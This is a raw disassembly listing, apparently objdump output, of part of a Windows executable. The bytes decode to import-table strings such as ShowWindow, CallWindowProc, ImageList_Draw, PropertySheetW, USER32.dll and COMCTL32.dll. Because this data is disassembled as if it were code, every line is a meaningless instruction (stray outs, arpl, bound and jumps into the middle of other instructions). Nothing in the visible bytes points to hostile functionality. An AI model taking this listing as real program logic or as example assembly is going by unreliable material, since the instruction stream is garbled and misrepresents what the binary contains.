  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
  412de6:	push   ebx
  412de7:	gs je  0x412e41
  412dea:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412df1:	outs   dx,BYTE PTR ds:[esi]
  412df2:	addr16 inc ecx
  412df4:	add    BYTE PTR [eax],al
  412df6:	adc    eax,0x6c655202
  412dfb:	gs popa 
  412dfd:	jae    0x412e64
  412dff:	inc    esp
  412e00:	inc    ebx
  412e01:	add    BYTE PTR [eax+eax*1],ah
  412e04:	inc    ebx
  412e05:	push   0x65676e61
  412e0a:	dec    ebp
  412e0b:	outs   dx,BYTE PTR gs:[esi]
  412e0d:	jne    0x412e66
  412e0f:	add    BYTE PTR [ebx],bh
  412e11:	add    BYTE PTR [ebx+0x68],al
  412e14:	arpl   WORD PTR gs:[ebx+0x4d],bp
  412e18:	outs   dx,BYTE PTR gs:[esi]
  412e1a:	jne    0x412e65
  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
